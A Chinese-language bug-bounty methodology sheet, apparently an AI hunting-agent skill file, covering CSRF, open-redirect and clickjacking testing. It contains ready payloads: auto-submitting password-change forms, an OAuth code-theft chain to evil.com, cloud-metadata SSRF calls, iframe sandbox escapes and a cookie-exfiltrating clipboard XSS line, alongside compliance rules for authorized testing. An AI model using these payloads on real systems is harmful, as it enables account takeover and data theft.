# CSRF / 开放重定向 / 点击劫持

> 让「受害者的浏览器」或「受害者的点击」替你执行动作。CSRF 单独中危，但打到改密/改邮箱/转账 → 高危；开放重定向单独 Low，链到 OAuth 授权码窃取 → ATO（Critical）；点击劫持把「看似无害的一击」变成敏感操作。

**取材来源**（本文件内容改编自，非整库复制）：
- [MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)、`12-clickjacking.md`
- [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)（report_count 28，sources hackerone_public）
- 权威公开源：PortSwigger Web Security Academy（Host 头 / CORS / 重定向类）——仅在源文件明确引用其研究时标注

---

## 1. 触发信号

- **CSRF**：登录态下的「状态改变」请求只靠 Cookie 鉴权，无 token / 无 `SameSite` / 无 `Origin` 校验
- **开放重定向**：URL 里出现 `?url=` `?next=` `?return=` `?redirect_uri=` 等参数，且响应 `Location:` 回显了你给的地址
- **点击劫持**：敏感操作页（删除/授权/改角色）响应头无 `X-Frame-Options` 也无 CSP `frame-ancestors`

> 路由规则：先看「谁能被谁利用」——CSRF 是「受害者浏览器替你发请求」，开放重定向是「受害者点了个看起来像 target.com 的链接」，点击劫持是「受害者点了个假按钮实际点到真按钮」。

## 2. 高频入口点

**开放重定向高危参数名**（[Claude-BugHunter]）：

```
?redirect=  ?next=  ?url=  ?return=  ?returnTo=  ?continue=  ?dest=  ?destination=
?go=  ?forward=  ?location=  ?target=  ?redir=  ?redirect_uri=  ?callback=
?checkout_url=  ?success_url=  ?cancel_url=
/logout?returnTo=  /login?next=  /sso?callback=
```

**CSRF 敏感操作**（[本地 src-hunter]）：改密码 / 改邮箱 / 转账 / 删数据 / 授权；表单型 POST、JSON API、GET 状态变更（`/delete?id=123`）都在范围。

**点击劫持检查点**（[本地 src-hunter]）：任何「删除 / 授权 / 加角色」按钮所在的页面。

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **开放重定向基础**：`?url=https://evil.com`，看 `Location:` 是否原样回显（`curl -I --max-redirs 0`）。
2. **开放重定向 bypass**：按第 4.3 矩阵逐条试，直到定位绕过校验的正则缺陷。
3. **开放重定向 → OAuth 链**：把目标域上的开放重定向填进 `redirect_uri`，看授权码是否被发到 evil.com（升 ATO）。
4. **CSRF 令牌缺失/可预测**：抓改密请求，删 token 参数/置空/复用旧 token，看是否仍 200。
5. **CSRF SameSite 绕过**：`SameSite=Lax` 时改走 GET/顶级导航；`SameSite=None` 缺 `Secure` 时直接跨站。
6. **点击劫持**：`curl -sI` 查安全头，缺失则做透明 iframe PoC（截图证明）。

## 4. Payload 区（每条标注出处）

### 4.1 CSRF 基础 `[本地 src-hunter]`

```html
<!-- 自动提交表单 -->
<form action="http://target.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="hidden" name="confirm_password" value="hacked123">
  <input type="submit" value="Click me">
</form>
<script>document.forms[0].submit();</script>

<!-- GET 型 CSRF -->
<img src="http://target.com/delete?id=123" style="display:none">
```

**JSON CSRF**（用 `text/plain` 绕过预检，或 FormData）`[本地 src-hunter]`：

```html
<script>
fetch("http://target.com/api/change-email", {
  method: "POST", credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({email: "attacker@evil.com"})
});
</script>
<!-- FormData 变体：formData.append("data", JSON.stringify({...})) -->
```

### 4.2 CSRF 绕过矩阵 `[本地 src-hunter]`

| 维度 | 手法 |
|---|---|
| Token 缺失 | 删 token 参数 / 置空 `?token=` / 删 token 头 |
| Token 可预测 | 时间戳 / 递增数字 / 用户 ID 哈希 / 弱随机数 |
| Token 未绑定会话 | 用攻击者自己的 token 构造 CSRF，受害者提交仍生效 |
| Token 重放 | 同一 token 多次使用、不过期 |
| Token 泄露 | token 出现在 URL / Referer / 日志 |
| 方法覆盖 | `POST /action?_method=PUT` / `X-HTTP-Method-Override: PUT` |
| Referer 校验 | `Referer: http://attacker.com/target.com/` / `http://target.com.attacker.com/`（正则只含/开头/结尾检查）；`<meta name="referrer" content="no-referrer">` 发空 Referer |
| Origin 校验 | data URL / `about:blank` 产生 `Origin: null`；`Origin: http://target.com.attacker.com`（正则绕过）|
| SameSite=Lax | `<img src="http://target.com/delete?id=123">`（GET 会带 Cookie）；顶级导航 `window.location=`；交互后 2 分钟窗口 |
| SameSite=Strict | 从子域名发起；`Set-Cookie: session=attacker; Domain=.target.com` 覆盖 Cookie |
| SameSite 未设置 | Chrome < 80 默认 None / Safari 默认 None，直接跨站 |

### 4.3 开放重定向 bypass `[Claude-BugHunter]`

| 技法 | Payload |
|---|---|
| Basic | `https://evil.com` |
| 协议相对 | `//evil.com` |
| 反斜杠 | `/\\evil.com` |
| @ 混淆 | `https://target.com@evil.com` |
| 双斜杠 | `//evil.com/%2F..` |
| URL 编码 | `%2Fevil.com` |
| Null 字节 | `evil.com%00target.com` |
| 空白 | `evil.com%09` / `%20` |
| JavaScript URI | `javascript:window.location='https://evil.com'` |
| Data URI | `data:text/html,<script>window.location='https://evil.com'</script>` |
| 子域名 | `https://target.com.evil.com` |
| 片段 | `https://evil.com#.target.com` |

**链条（[Claude-BugHunter] Chain Table）**：

| 开放重定向发现 | 链到 | 影响 |
|---|---|---|
| 任意开放重定向 | OAuth redirect_uri 绕过 | 授权码窃取 → ATO |
| 任意开放重定向 | 以 target.com 开头的钓鱼 URL | 社工 / 品牌滥用 |
| 服务端跟随重定向 | SSRF | 内网访问 |
| logout 重定向 | 会话固定 | 强制用已知会话登录 |

**OAuth 链构造**（[Claude-BugHunter] Phase 4）：

```bash
# 正常：redirect_uri=https://target.com/callback
# 攻击：redirect_uri=https://target.com/redirect?url=https://evil.com
curl -sv "https://$TARGET/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://$TARGET/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com" 2>&1 | grep -i "location:"
```

**服务端跟随 → SSRF 升级**（[Claude-BugHunter] Phase 5）：

```bash
curl -s "https://$TARGET/proxy?url=https://evil.com/redirect-to-169.254.169.254/latest/meta-data/"
curl -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" -H "Cookie: $SESSION"
```

### 4.4 Clickjacking（简略）`[本地 src-hunter]`

```html
<!-- 透明 iframe 覆盖诱饵按钮 -->
<style>
  #target-frame { position:absolute; top:0; left:0; width:500px; height:500px;
                  opacity:0.0001; z-index:2; border:none; }
  #decoy-btn   { position:absolute; top:120px; left:50px; z-index:1; }
</style>
<button id="decoy-btn">Claim Prize</button>
<iframe id="target-frame" src="http://target.com/account/delete"></iframe>
```

- `pointer-events:none` 让覆盖层不拦截点击，直接穿透到下层 iframe
- `sandbox="allow-scripts allow-top-navigation"` 绕过部分 frame-busting；`X-Frame-Options: ALLOW-FROM` 在 Chrome/Safari 被忽略，仅 CSP `frame-ancestors` 生效

**绕过变体**（[本地 src-hunter 12-clickjacking]）：

```html
<!-- 双重嵌套 iframe：frame-busting 的 top 指向中间页而非攻击页 -->
<iframe src="middle-page.html"></iframe>   <!-- middle-page.html 内再 iframe 目标 -->

<!-- sandbox 组合逃逸 -->
<iframe srcdoc="<script>top.location='https://target.com'</script>" sandbox="allow-scripts allow-top-navigation"></iframe>
<iframe src="https://target.com" sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox"></iframe>
```

**拖拽劫持（跨域提取）**：HTML5 `drag`/`drop` 事件在透明 iframe 上监听，可跨域拿到 `dataTransfer` 内容。**Clickjacking + XSS 组合**：先用点击劫持诱导受害者点编辑按钮，再 `navigator.clipboard.writeText('<img src=x onerror=fetch(evil+document.cookie)>')` 诱导 Ctrl+V 粘贴触发 self-XSS。

## 5. 工具用法

```bash
# 开放重定向发现 + 批量验证
cat urls.txt | gf redirect > redirect-candidates.txt
cat redirect-candidates.txt | qsreplace "https://evil.com" | while read url; do
  curl -s -I --max-redirs 0 "$url" | grep -i "^location:"
done

# 单点 bypass 循环（[Claude-BugHunter]）
for P in "https://evil.com" "//evil.com" "/\\evil.com" "https://$TARGET@evil.com" "https://evil.com%23.$TARGET"; do
  curl -s -I --max-redirs 0 "https://$TARGET/redirect?url=$P" | grep -i "^location:"
done

# 自动化
pip3 install openredirex && openredirex -l redirect-candidates.txt -p evil.com
nuclei -u https://$TARGET -t redirect/ -severity medium,high

# 点击劫持安全头批量检测（[本地 src-hunter]）
for url in $(cat urls.txt); do
  xfo=$(curl -sI "$url" | grep -i "x-frame-options")
  csp=$(curl -sI "$url" | grep -i "frame-ancestors")
  [ -z "$xfo" ] && [ -z "$csp" ] && echo "VULNERABLE: $url" || echo "Protected: $url"
done
```

## 6. 证据要求

- **开放重定向「已确认」**：`curl -sI --max-redirs 0` 的 `Location:` 头指向你控制的域（evil.com / Collaborator）；保存完整请求 + `Location` 回显截图。
- **开放重定向升 ATO**：必须证明授权码被发到攻击者域——用 Burp Collaborator 作注入域，捕获带 `code=` 的回调。
- **CSRF「已确认」**：删 token / 置空 / 复用后，目标状态真实改变（截图前后差异：改邮箱前/后、改密成功提示）；PoC 是能在受害者浏览器自动提交的 HTML，且用无痕窗口复现 2 次。
- **点击劫持「已确认」**：浏览器中诱饵页叠加透明 iframe 的截图 + 点击诱饵按钮实际触发目标敏感操作的证据（操作日志 / 状态变化）。
- **CVSS 参考**：CSRF 改密 `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N = 6.5`；开放重定向单独 `C:L = 3.1`，链 OAuth→ATO `I:H/A:H = 8.1+`。

## 7. 合规边界 / 不要做的事

- **禁**：CSRF PoC 真改受害者的真实密码/邮箱——用自己注册的测试账号验证状态改变即可，报告里写「对测试账号生效」。
- **禁**：对真实用户群发钓鱼/诱导链接，不把开放重定向当真钓鱼页落地。
- **禁**：OAuth 链只证明「授权码能到你手里」，不实际用授权码登录目标账号。
- **禁**：点击劫持 PoC 中不对目标执行不可逆操作（删号/销户）。
- **脱敏**：报告中的 email/password 一律替换为 attacker@evil.com / 占位值；截图给目标站敏感 UI 打码。
